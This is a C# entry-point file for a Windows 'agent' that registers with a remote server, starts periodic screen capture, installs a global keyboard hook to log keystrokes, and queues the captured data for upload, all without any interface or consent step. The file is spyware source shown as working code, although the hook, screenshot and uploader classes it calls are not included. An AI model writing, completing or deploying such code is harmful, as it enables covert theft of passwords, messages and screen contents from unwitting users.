using Common.ConfigurationManager;
using Common.Helpers;
using Common.Interfaces;
using Common.Models;
using KeyLogger.Interfaces;
using ks.EngineServices;
using Screenshot.Interfaces;
using Screenshot.Services;
using System;
using System.Net.Http;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ks
{
    public class Program
    {
        [STAThread]
        static async Task Main(string[] args)
        {
            ILogger logger = new Logger();

            try
            {
                // ------------------ DB Tables ------------------
                DBContexts.CreateTableIfNotExists<Configurations>();
                DBContexts.CreateTableIfNotExists<KeyEvents>();
                DBContexts.CreateTableIfNotExists<KeySessions>();
                DBContexts.CreateTableIfNotExists<Machines>();
                DBContexts.CreateTableIfNotExists<Screenshots>();
                DBContexts.CreateTableIfNotExists<UploadQueue>();
                DBContexts.CreateTableIfNotExists<KeyLoggerConf>();
                DBContexts.CreateTableIfNotExists<ScreenshotConf>();
                DBContexts.CreateTableIfNotExists<UploadConf>();
                DBContexts.CreateTableIfNotExists<LoggerEntry>();
                logger.LogInformation("All database tables verified or created.");

                var httpClient = new HttpClient();

                // ------------------ Agent Registration ------------------
                var regAndReceiver = new RegistrationAndReceiver(httpClient, logger);
                var receiverTask = Task.Run(() => regAndReceiver.StartAsync(default));

                // ------------------ Screenshot Service ------------------
                ITakeScreenshot screenshot = new TakeScreenshot(logger);
                ICaptureWithInterval captureScr = new CaptureWithInterval(screenshot, logger);
                captureScr.Capture();
                logger.LogInformation("Screenshot service started.");

                // ------------------ Keylogger ------------------
                IKeyLoggerEngine engine = new KeyLoggerEngine(logger);
                IKeyLoggerHook hook = new KeyloggerHook(engine, logger);
                hook.Start();
                logger.LogInformation("Keylogger hook started.");

                // ------------------ Uploader Service ------------------
                UploaderService uploader = new UploaderService(logger);
                logger.LogInformation("Uploader service initialized.");

                logger.LogInformation("Agent is running....");
                Application.Run(); // Windows message loop

                // Background service task stop
                await regAndReceiver.StopAsync(default);
                await receiverTask;
            }
            catch (Exception ex)
            {
                logger.LogError($"Fatal error: {ex.Message}\nStackTrace: {ex.StackTrace}");
            }
        }
    }
}
